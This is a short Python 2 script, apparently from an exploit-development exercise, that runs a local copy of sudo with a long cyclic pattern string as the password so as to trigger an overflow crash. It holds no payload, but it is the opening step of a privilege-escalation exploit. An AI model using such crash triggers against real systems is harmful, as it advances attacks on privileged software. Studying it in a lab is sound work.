import os, sys


PATH_TO_SUDO = './sudo'
PATH_TO_GDB = '/usr/bin/gdb'

def crash_sudo():
	#calls sudo with the overflowded password
    os.execl( PATH_TO_SUDO, PATH_TO_SUDO,str('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS'), "ls")

def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    crash_sudo()


if __name__ == '__main__':
    main(sys.argv)
